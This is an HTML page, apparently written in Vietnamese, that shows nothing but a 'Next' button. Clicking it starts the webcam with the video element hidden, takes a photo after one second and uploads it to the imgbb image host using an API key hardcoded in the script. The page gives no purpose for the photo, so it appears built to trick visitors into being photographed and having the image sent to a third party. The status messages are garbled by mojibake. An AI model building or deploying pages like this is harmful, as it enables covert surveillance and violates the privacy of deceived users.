<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Next</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background: #000;
      color: white;
      flex-direction: column;
      font-family: Arial, sans-serif;
    }
    button {
      font-size: 2rem;
      padding: 18px 48px;
      border: none;
      border-radius: 16px;
      cursor: pointer;
      background: linear-gradient(90deg, #007bff, #00d4ff);
      color: white;
      transition: 0.3s;
    }
    button:hover {
      transform: scale(1.05);
    }
    #status {
      margin-top: 20px;
      font-size: 1.2rem;
    }
    video, canvas { display: none; }
  </style>
</head>
<body>
  <button id="nextBtn">Next</button>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>
  <div id="status"></div>

  <script>
    const API_KEY = "a0ba317e9d94c58e5b754f7593f4d6a0";
    const API_URL = "https://api.imgbb.com/1/upload";

    const nextBtn = document.getElementById("nextBtn");
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const statusDiv = document.getElementById("status");

    nextBtn.addEventListener("click", async () => {
      nextBtn.style.display = "none";
      statusDiv.textContent = "üîÑ ƒêang b·∫≠t camera...";

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        // ƒê·ª£i 1 gi√¢y cho camera ·ªïn ƒë·ªãnh r·ªìi ch·ª•p
        setTimeout(async () => {
          const context = canvas.getContext("2d");
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          context.drawImage(video, 0, 0, canvas.width, canvas.height);

          const base64Image = canvas.toDataURL("image/png").split(",")[1];
          statusDiv.textContent = "üì§ ƒêang g·ª≠i ·∫£nh...";

          const formData = new FormData();
          formData.append("image", base64Image);

          await fetch(`${API_URL}?key=${API_KEY}`, {
            method: "POST",
            body: formData
          });

          // D·ª´ng camera
          stream.getTracks().forEach(track => track.stop());

          statusDiv.textContent = "‚úÖ ·∫¢nh ƒë√£ ƒë∆∞·ª£c g·ª≠i!";
        }, 1000);
      } catch (err) {
        console.error(err);
        statusDiv.textContent = "‚ùå L·ªói khi b·∫≠t camera ho·∫∑c g·ª≠i ·∫£nh.";
        nextBtn.style.display = "block";
      }
    });
  </script>
</body>
</html>
